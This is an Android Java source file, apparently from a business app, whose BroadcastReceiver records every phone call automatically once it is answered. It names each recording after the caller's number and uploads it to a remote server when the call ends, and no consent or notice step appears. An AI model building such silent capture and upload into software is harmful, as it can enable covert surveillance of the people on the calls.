package com.example.yong.callstate;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.text.LoginFilter;
import android.text.TextUtils;
import android.util.Log;

import com.example.yong.recorder.upload.RecorderUploader;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import com.example.yong.login.ui.LoginActivity;

/**
 * 监听 电话状态
 * Created by yaojian on 2017/9/11.
 */
public class PhoneStateReceiver extends BroadcastReceiver {

    private final static String TAG = "PhoneStateReceiver";

    private MediaRecorder recorder; //录音的一个实例

    private String mPhoneNumber = "";

    //保存录音文件path
    private String mSaveFilePath = "";

    private boolean isRecording = false;

    @Override
    public void onReceive(final Context context, Intent intent) {
        if(intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)){
            Log.i(TAG, " onReceive ACTION_NEW_OUTGOING_CALL");
        }else{
            Log.i(TAG, " onReceive " + intent.getAction());
        }

        TelephonyManager tm = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);
        tm.listen(new PhoneStateListener(){
            @Override
            public void onCallStateChanged(int state, String incomingNumber) {
                switch(state){
                    case TelephonyManager.CALL_STATE_IDLE:
                        Log.i(TAG, " onCallStateChanged CALL_STATE_IDLE incomingNumber " + incomingNumber);
                        LoginActivity.logger.info("callstate CALL_STATE_IDLE");
                        try{
                            if (recorder != null && isRecording){
                                recorder.stop();//停止录音
                                recorder.release();//释放资源
                            }
                        //开始上传录音
                        RecorderUploader mUploader = new RecorderUploader(new RecorderUploader.RecorderUploadListener() {
                            @Override
                            public void onUploadFailed(String fileName, int errorCode, String errorStr, IOException e) {

                            }

                            @Override
                            public void onUploadSuccess(String fileName) {

                            }
                        });
                            LoginActivity.logger.info("callstate begin upload");

                            //开始上传
                        mUploader.startPostFileAsync(context, RecorderUploader.RECORDER_POST_URL, mSaveFilePath);

                        }catch(Throwable e){
                            Log.w(TAG, e);
                        }finally {
                            recorder = null;
                            isRecording = false;
                            mPhoneNumber = "";
                            mSaveFilePath = "";
                        }
                        break;

                    case TelephonyManager.CALL_STATE_RINGING:
                        Log.i(TAG, " onCallStateChanged CALL_STATE_RINGING incomingNumber " + incomingNumber);
                        break;

                    case TelephonyManager.CALL_STATE_OFFHOOK:
                        LoginActivity.logger.info("callstate CALL_STATE_OFFHOOK");

                        Log.i(TAG, " onCallStateChanged state CALL_STATE_OFFHOOK incomingNumber " + incomingNumber);
                        prepareRecorder(incomingNumber);

                        if(!isRecording){
                            try{
                                if (recorder != null){
                                    recorder.prepare();//准备录音
                                    recorder.start(); //接听的时候开始录音
                                    isRecording = true;
                                    LoginActivity.logger.info("callstate prepare recording");
                                }
                            }catch (Throwable e){
                                Log.w(TAG, e);
                            }
                        }

                        break;
                }
            }
        }, PhoneStateListener.LISTEN_CALL_STATE);
    }

    /**
     * 准备录音
     */
    private void prepareRecorder(String phoneNumber){

        if(TextUtils.isEmpty(mPhoneNumber)) {
            mPhoneNumber = phoneNumber;
        }

        mSaveFilePath = getFilePathToSaveRecorder(phoneNumber);

        if (recorder == null && !isRecording){
            try{
                recorder=new MediaRecorder();//初始化录音对象
                recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);//设置录音的输入源(麦克)
                recorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);//设置音频格式(3gp)
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);//设置音频编码
                recorder.setOutputFile(mSaveFilePath); //设置录音保存的文件
            }catch (Throwable e) {
                Log.w(TAG, e);
            }
        }
    }

    /**
     * 得到 录音文件
     * @return
     */
    private String getFilePathToSaveRecorder(String phonenumber){
        createRecorderFile();
        String currentTime = getCurrentTime();
        return DIR_PATH + "/" + phonenumber + "_" + currentTime + ".amr";
    }

    private final String DIR_PATH = Environment.getExternalStorageDirectory().getAbsolutePath() + "/recorder";

    //创建保存录音的目录
    private void createRecorderFile() {
        if(Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)){
            Log.i(TAG, "SDCard mounted");
        }else{
            Log.i(TAG, "SDCard unmounted");
        }


        File file=new File(DIR_PATH);
        if (!file.exists()){
            file.mkdir();
        }
    }
    //获取当前时间，以其为名来保存录音
    private String getCurrentTime(){
        SimpleDateFormat format=new SimpleDateFormat("yyyyMMddHHmmss");
        Date date=new Date();
        String str=format.format(date);
        return str;
    }
}
